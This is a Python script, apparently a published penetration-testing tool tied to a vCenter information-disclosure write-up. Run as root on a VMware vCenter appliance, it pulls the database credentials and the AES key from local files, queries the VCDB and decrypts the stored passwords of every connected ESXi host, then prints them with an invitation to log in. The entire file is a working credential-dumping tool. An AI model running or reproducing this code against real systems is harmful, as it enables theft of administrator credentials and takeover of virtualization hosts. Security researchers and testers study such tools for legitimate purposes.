#!/usr/bin/env python3
r'''
	Copyright 2022 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.

        Source: https://www.pentera.io/blog/information-disclosure-in-vmware-vcenter/
        This script attempts to decode ESXi Hosts' passwords and in 
        future versions other interesting data within a vCenter Appliance setup
        
        It requires root access, or the extracted files + data
'''
import os, optparse, subprocess, base64
from Crypto.Cipher import AES

def getAllHosts(sDBUser, sDBPass):
    sCommand = 'PGPASSWORD="{}" /opt/vmware/vpostgres/current/bin/psql -d VCDB -U "{}" -c \'SELECT dns_name, ip_address, user_name, password FROM vc.vpx_host;\''.format(sDBPass, sDBUser)
    bResult = subprocess.run([sCommand], shell=True, stdout=subprocess.PIPE).stdout
    lstHosts = []
    for bLine in bResult.split(b'\n'):
        if b'ip_address' in bLine: continue
        if b'---' in bLine: continue
        if b'rows)' in bLine: continue
        if not b'|' in bLine: continue
        if bLine == b'': continue
        sLine = bLine.decode(errors='ignore')
        sHostname = sLine.split('|')[0].strip()
        sIPaddress = sLine.split('|')[1].strip()
        sUsername = sLine.split('|')[2].strip()
        sEncryptedPass = sLine.split('|')[3].strip()
        lstHosts.append((sHostname, sIPaddress, sUsername, sEncryptedPass))
        #print('Found host with hostname {} and IP {}, accessed via user {} ({})'.format(sHostname, sIPaddress, sUsername, sEncryptedPass))
    print('[+] Found {} hosts'.format(len(lstHosts)))
    return lstHosts

def decryptHosts(lstHosts, sKey = None):
    if not sKey: 
        sKey = open('/etc/vmware-vpx/ssl/symkey.dat','r').read().strip()
        print('[*] Read AES key: {}'.format(sKey))
    bKey = bytes.fromhex(sKey)
    lstNewHosts = []
    for lstHost in lstHosts:
        bEncPassword = base64.b64decode(lstHost[3].replace('*',''))
        bIV = bEncPassword[:16]
        bEncrypted = bEncPassword[16:]
        oAES = AES.new(bKey, AES.MODE_CBC, bIV)
        sPassword = oAES.decrypt(bEncrypted).strip(b'\x10').decode('utf-8')
        lstNewHosts.append((lstHost[0], lstHost[1], lstHost[2], sPassword))
    return lstNewHosts

def getDBPassword():
    sPassword = sUsername = None
    oFullFile = open('/etc/vmware-vpx/vcdb.properties','r')
    for sLine in oFullFile.readlines(): 
        if 'username =' in sLine: sUsername = sLine.split(' ')[-1].strip()
        if 'password =' in sLine: sPassword = sLine.split(' ')[-1].strip()
    oFullFile.close()
    if sPassword and sUsername: print('[+] Found DB password for user {}: {}'.format(sUsername, sPassword))
    return sUsername, sPassword

def getVCenterVersion():
    sVersion = open('/etc/vmware-cis-license/version.txt','r').read()
    print('[+] Detected vCenter Version: {}'.format(sVersion))
    return

def main():
    sUsage = ('Just run this script as root on vCenter to dump some interesting stuff.\n\n'
              'Currently: decrypted credentials for all connected ESXi hosts\n'
              'By default it should be run as root\n'
              'As soon as options are used, the root check is ignored\n\n'
              '1. PostgreSQL credentials are in /etc/vmware-vpx/vcdb.properties\n'
              '2. AES encryption key is in /etc/vmware-vpx/ssl/symkey.dat')
    oParser = optparse.OptionParser(usage = sUsage)
    oParser.add_option('--dbusername', '-u', metavar='STRING', dest='dbuser', help='PGSQL Username')
    oParser.add_option('--dbpassword', '-p', metavar='STRING', dest='dbpass', help='PGSQL Password')
    oParser.add_option('--aeskey', '-k', metavar='STRING', dest='aeskey', help='AES Decryptkey (in HEX)')
    (dictOptions,args) = oParser.parse_args()

    if not dictOptions.dbuser and not dictOptions.dbpass and not dictOptions.aeskey: boolParams = False
    else: boolParams = True
    
    if not boolParams and not os.path.exists('/usr/bin/vmware-checkvm'): 
        print('[-] Error, this is probably not a vCenter (Appliance) installation, exiting due to lack of args')
        exit(0)
    
    if not boolParams and os.geteuid() > 0: 
        print('[-] Error, you are not root, exiting due to lack of args')
        exit(0)

    ## Get and print exact vCenter Version
    if not boolParams: getVCenterVersion()

    ## When not provided, get DB creds
    sDBUser = dictOptions.dbuser
    sDBPass = dictOptions.dbpass
    if not dictOptions.dbuser and not dictOptions.dbpass: sDBUser, sDBPass = getDBPassword()
    
    ## Using DB creds, get all ESXi hosts
    lstHosts = getAllHosts(sDBUser, sDBPass)

    ## Decrypt ESXi host passwords
    lstDecryptedHosts = decryptHosts(lstHosts, dictOptions.aeskey)
    
    ## Print decrypted data
    print('[+] Successfully decrypted {} ESXi host passwords.'.format(len(lstDecryptedHosts)))
    print('{0:30} | {1:15} | {2:15} | {3:33}'.format('DNS Hostname', 'IP Address', 'Username', 'Password'))
    print('-'*101)
    for lstHost in lstDecryptedHosts: print('{0:30} | {1:15} | {2:15} | {3:33}'.format(lstHost[0], lstHost[1], lstHost[2], lstHost[3]))
    print('[+] Feel free to visit their web interfaces to log in')

if __name__ == "__main__":
    main()
